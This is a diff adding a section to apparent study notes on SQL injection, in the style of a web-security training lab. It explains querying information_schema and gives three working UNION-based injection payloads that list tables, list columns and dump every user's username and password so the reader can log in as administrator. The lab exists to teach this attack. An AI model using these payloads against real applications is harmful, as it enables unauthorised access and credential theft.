@@ -156,3 +156,25 @@ For example, you could use a UNION attack with the following input:
 
 ## LAB 
 https://youtu.be/MFTk_LNRW0g?si=O3ixXs8q6otcu1vL
+
+## Listing the contents of the database
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query information_schema.tables to list the tables in the database:
+
+SELECT * FROM information_schema.tables
+
+## LAB
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+Use the following payload to retrieve the list of tables in the database: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table:'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+https://youtu.be/JduM_dO8glw?si=HFg21cw6nXhxF9C2
